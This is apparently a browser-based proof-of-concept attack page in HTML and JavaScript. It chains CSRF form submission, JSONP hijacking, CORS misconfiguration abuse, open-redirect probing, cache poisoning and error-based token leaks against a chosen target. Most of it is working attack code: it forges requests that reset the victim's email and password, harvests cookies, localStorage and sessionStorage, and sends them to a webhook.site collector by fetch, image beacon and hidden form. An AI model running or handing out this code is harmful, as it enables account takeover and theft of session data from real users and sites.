<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Token Theft Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .log {
            background: #1a1a1a;
            color: #00ff00;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            height: 300px;
            overflow-y: auto;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background: #ff3b30;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #ff1c10;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF â†’ Token Theft Attack PoC</h1>
        <p><strong>Target:</strong> example.com</p>
        <p><strong>Webhook URL:</strong> <span id="webhookUrl">https://webhook.site/[YOUR-ID]</span></p>
        
        <div>
            <input type="text" id="targetUrl" placeholder="https://example.com" value="https://example.com">
            <input type="text" id="webhookInput" placeholder="https://webhook.site/your-id" value="https://webhook.site/your-id">
            <button onclick="startAttack()">ðŸš€ Start Attack</button>
        </div>
        
        <h3>Attack Log:</h3>
        <div class="log" id="log">
[+] Attack script loaded
[+] Ready to start attack...
        </div>
        
        <h3>Stolen Data:</h3>
        <div class="log" id="data">
No data captured yet
        </div>
    </div>

<script>
// ===== CONFIGURATION =====
const VERSION = "1.0";
const ATTACK_TECHNIQUES = ['CSRF', 'JSONP', 'CORS', 'REDIRECT', 'FORM'];
let WEBHOOK_URL = 'https://webhook.site/your-unique-id';
let TARGET_DOMAIN = 'example.com';

// ===== LOGGING SYSTEM =====
function log(message) {
    const timestamp = new Date().toLocaleTimeString();
    const logElement = document.getElementById('log');
    logElement.innerHTML += `\n[${timestamp}] ${message}`;
    logElement.scrollTop = logElement.scrollHeight;
}

function updateData(data) {
    document.getElementById('data').innerHTML = JSON.stringify(data, null, 2);
}

// ===== DATA EXFILTRATION =====
function exfiltrateData(payload) {
    const data = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        payload: payload
    };
    
    // Method 1: Fetch with no-cors
    fetch(WEBHOOK_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
    
    // Method 2: Image beacon
    const img = new Image();
    const encodedData = btoa(JSON.stringify(data));
    img.src = `${WEBHOOK_URL}/img?d=${encodedData}`;
    
    // Method 3: Form submission
    const form = document.createElement('form');
    form.action = WEBHOOK_URL;
    form.method = 'POST';
    form.style.display = 'none';
    
    const input = document.createElement('input');
    input.name = 'data';
    input.value = JSON.stringify(data);
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
    
    log(`âœ“ Data exfiltrated to webhook`);
}

// ===== ATTACK TECHNIQUES =====

// Technique 1: Classic CSRF Form Injection
function performCSRFAttack(targetUrl) {
    log(`Starting CSRF attack to ${targetUrl}`);
    
    // Try to submit forms to various endpoints
    const endpoints = [
        `${targetUrl}/settings/profile`,
        `${targetUrl}/settings/email`,
        `${targetUrl}/settings/password`,
        `${targetUrl}/api/user`
    ];
    
    endpoints.forEach(endpoint => {
        const form = document.createElement('form');
        form.action = endpoint;
        form.method = 'POST';
        form.style.display = 'none';
        form.target = '_blank';
        
        // Add CSRF token field (if we can guess the name)
        const tokenFields = ['authenticity_token', 'csrf_token', '_token', 'csrfmiddlewaretoken', 'token'];
        tokenFields.forEach(fieldName => {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = fieldName;
            input.value = 'STOLEN_TOKEN_PLACEHOLDER';
            form.appendChild(input);
        });
        
        // Add malicious data
        const maliciousData = {
            'user[email]': 'attacker@evil.com',
            'user[name]': 'Hacked User',
            'new_password': 'hacked123',
            'confirm_password': 'hacked123'
        };
        
        Object.entries(maliciousData).forEach(([key, value]) => {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = value;
            form.appendChild(input);
        });
        
        // Add _method for Rails/Laravel
        const methodInput = document.createElement('input');
        methodInput.type = 'hidden';
        methodInput.name = '_method';
        methodInput.value = 'PUT';
        form.appendChild(methodInput);
        
        document.body.appendChild(form);
        
        setTimeout(() => {
            log(`Submitting CSRF form to ${endpoint}`);
            form.submit();
            document.body.removeChild(form);
        }, 1000);
    });
}

// Technique 2: JSONP Hijacking
function performJSONPHijacking(targetUrl) {
    log(`Attempting JSONP hijacking on ${targetUrl}`);
    
    // Common JSONP callback parameter names
    const callbacks = ['callback', 'cb', 'jsonp', 'jsoncallback', 'func'];
    
    // Common JSONP endpoints
    const jsonpEndpoints = [
        `${targetUrl}/api/user`,
        `${targetUrl}/api/profile`,
        `${targetUrl}/api/settings`,
        `${targetUrl}/user/jsonp`,
        `${targetUrl}/data/jsonp`
    ];
    
    // Global callback function to capture data
    window.jsonpCallback = function(data) {
        log(`âœ“ JSONP data captured: ${JSON.stringify(data).substring(0, 100)}...`);
        exfiltrateData({
            technique: 'JSONP_HIJACKING',
            endpoint: this.currentEndpoint,
            data: data
        });
    };
    
    // Test each endpoint with each callback parameter
    jsonpEndpoints.forEach(endpoint => {
        callbacks.forEach(callbackParam => {
            const script = document.createElement('script');
            const url = `${endpoint}?${callbackParam}=jsonpCallback`;
            script.src = url;
            script.onload = function() {
                log(`JSONP script loaded: ${url}`);
            };
            script.onerror = function() {
                // Script failed to load (expected for most endpoints)
            };
            
            window.jsonpCallback.currentEndpoint = endpoint;
            document.head.appendChild(script);
            
            setTimeout(() => {
                if (script.parentNode) {
                    script.parentNode.removeChild(script);
                }
            }, 5000);
        });
    });
}

// Technique 3: CORS Misconfiguration Exploit
async function exploitCORS(targetUrl) {
    log(`Testing CORS misconfigurations on ${targetUrl}`);
    
    const corsEndpoints = [
        `${targetUrl}/api/user`,
        `${targetUrl}/api/profile`,
        `${targetUrl}/api/settings`,
        `${targetUrl}/user/info`,
        `${targetUrl}/data/user`
    ];
    
    for (const endpoint of corsEndpoints) {
        try {
            const response = await fetch(endpoint, {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Origin': 'https://evil.com',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
            
            const acao = response.headers.get('Access-Control-Allow-Origin');
            const acac = response.headers.get('Access-Control-Allow-Credentials');
            
            if (acao === '*' || acac === 'true') {
                log(`âœ“ CORS misconfiguration found at ${endpoint}`);
                log(`  ACAO: ${acao}, ACAC: ${acac}`);
                
                // Try to get data
                const data = await response.json();
                exfiltrateData({
                    technique: 'CORS_MISCONFIG',
                    endpoint: endpoint,
                    data: data,
                    headers: { acao, acac }
                });
            }
        } catch (error) {
            // Expected for most endpoints
        }
    }
}

// Technique 4: Open Redirect Exploitation
function exploitOpenRedirects(targetUrl) {
    log(`Testing for open redirects on ${targetUrl}`);
    
    const redirectParams = ['redirect', 'return', 'url', 'next', 'r', 'u', 'return_to'];
    const testPaths = [
        '/login',
        '/logout',
        '/auth',
        '/oauth',
        '/callback'
    ];
    
    // Create hidden iframes to test redirects
    testPaths.forEach(path => {
        redirectParams.forEach(param => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            
            // Try to redirect to our webhook with stolen data in URL fragment
            const maliciousRedirect = `${WEBHOOK_URL}/steal#${btoa(`from=${targetUrl}&cookies=${encodeURIComponent(document.cookie)}`)}`;
            const testUrl = `${targetUrl}${path}?${param}=${encodeURIComponent(maliciousRedirect)}`;
            
            iframe.src = testUrl;
            iframe.onload = function() {
                log(`Iframe loaded: ${testUrl}`);
                // Check if we were redirected
                try {
                    if (iframe.contentWindow.location.href.includes(WEBHOOK_URL)) {
                        log(`âœ“ Open redirect found!`);
                        exfiltrateData({
                            technique: 'OPEN_REDIRECT',
                            vulnerable_url: testUrl,
                            redirect_target: iframe.contentWindow.location.href
                        });
                    }
                } catch (e) {
                    // SOP prevents reading iframe location
                }
            };
            
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                if (iframe.parentNode) {
                    iframe.parentNode.removeChild(iframe);
                }
            }, 3000);
        });
    });
}

// Technique 5: Cache Poisoning/Deception
function performCacheDeception(targetUrl) {
    log(`Attempting cache deception attacks`);
    
    // Try to poison cache with malicious responses
    const cacheUrls = [
        `${targetUrl}/static/user.js`,
        `${targetUrl}/assets/profile.json`,
        `${targetUrl}/cache/user`
    ];
    
    cacheUrls.forEach(url => {
        // Add cache-busting parameters that might get cached
        const cacheBustedUrl = `${url}?cache_id=${Date.now()}&user_data=${btoa(document.cookie)}`;
        
        fetch(cacheBustedUrl, {
            method: 'GET',
            headers: {
                'X-Forwarded-Host': 'evil.com',
                'Host': 'evil.com'
            }
        }).then(response => {
            log(`Cache request sent to ${url}`);
        }).catch(() => {});
    });
}

// Technique 6: CSRF to Token Leak via Error Messages
function leakTokensViaError(targetUrl) {
    log(`Trying to leak tokens via error messages`);
    
    // Submit malformed requests that might leak tokens in error responses
    const malformedRequests = [
        {
            url: `${targetUrl}/api/user`,
            method: 'POST',
            body: '{"malformed": true, "token": "',
            contentType: 'application/json'
        },
        {
            url: `${targetUrl}/graphql`,
            method: 'POST',
            body: '{"query": "{user {id email token}}"',
            contentType: 'application/json'
        }
    ];
    
    malformedRequests.forEach(req => {
        fetch(req.url, {
            method: req.method,
            headers: {
                'Content-Type': req.contentType,
                'X-CSRF-Token': 'malicious'
            },
            body: req.body,
            credentials: 'include'
        })
        .then(response => response.text())
        .then(text => {
            // Check if response contains token-like strings
            const tokenPatterns = [
                /token['"]?\s*:\s*['"]([^'"]+)['"]/i,
                /csrf['"]([^'"]+)['"]/i,
                /authenticity_token['"]?\s*=\s*['"]([^'"]+)['"]/i
            ];
            
            tokenPatterns.forEach(pattern => {
                const match = text.match(pattern);
                if (match && match[1]) {
                    log(`âœ“ Token leaked in error: ${match[1].substring(0, 30)}...`);
                    exfiltrateData({
                        technique: 'ERROR_LEAK',
                        endpoint: req.url,
                        token: match[1]
                    });
                }
            });
        })
        .catch(() => {});
    });
}

// ===== MAIN ATTACK FUNCTION =====
async function startAttack() {
    const targetUrl = document.getElementById('targetUrl').value;
    WEBHOOK_URL = document.getElementById('webhookInput').value;
    
    if (!targetUrl || !WEBHOOK_URL) {
        alert('Please enter both target URL and webhook URL');
        return;
    }
    
    TARGET_DOMAIN = new URL(targetUrl).hostname;
    
    log(`===== STARTING ATTACK ON ${TARGET_DOMAIN} =====`);
    log(`Webhook: ${WEBHOOK_URL}`);
    log(`User Agent: ${navigator.userAgent}`);
    
    // Collect initial victim data
    const victimData = {
        domain: TARGET_DOMAIN,
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        url: window.location.href,
        referrer: document.referrer
    };
    
    // Try to collect localStorage and sessionStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            victimData.localStorage[key] = localStorage.getItem(key);
        }
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            victimData.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch (e) {
        log(`Cannot access storage: ${e.message}`);
    }
    
    exfiltrateData({ type: 'VICTIM_INFO', data: victimData });
    
    // Execute attack techniques in sequence
    const techniques = [
        { name: 'JSONP Hijacking', func: () => performJSONPHijacking(targetUrl) },
        { name: 'CORS Exploitation', func: () => exploitCORS(targetUrl) },
        { name: 'Open Redirects', func: () => exploitOpenRedirects(targetUrl) },
        { name: 'Token Leak via Errors', func: () => leakTokensViaError(targetUrl) },
        { name: 'Cache Deception', func: () => performCacheDeception(targetUrl) },
        { name: 'CSRF Form Injection', func: () => performCSRFAttack(targetUrl) }
    ];
    
    for (let i = 0; i < techniques.length; i++) {
        log(`\n[${i+1}/${techniques.length}] Executing: ${techniques[i].name}`);
        try {
            await techniques[i].func();
            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait between techniques
        } catch (error) {
            log(`Error in ${techniques[i].name}: ${error.message}`);
        }
    }
    
    log(`\n===== ATTACK COMPLETED =====`);
    log(`All techniques executed against ${TARGET_DOMAIN}`);
    log(`Data sent to webhook: ${WEBHOOK_URL}`);
    
    // Final summary
    const summary = {
        target: TARGET_DOMAIN,
        techniques_executed: techniques.length,
        timestamp: new Date().toISOString(),
        attack_duration: `${techniques.length * 2} seconds`
    };
    
    exfiltrateData({ type: 'ATTACK_SUMMARY', data: summary });
}

// Auto-start if parameters in URL
window.addEventListener('load', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const target = urlParams.get('target');
    const webhook = urlParams.get('webhook');
    
    if (target) {
        document.getElementById('targetUrl').value = target;
    }
    if (webhook) {
        document.getElementById('webhookInput').value = webhook;
    }
    
    // Example usage: attack.html?target=https://example.com&webhook=https://webhook.site/your-id
});

// Add webhook placeholder
document.getElementById('webhookUrl').textContent = WEBHOOK_URL;
</script>
</body>
</html>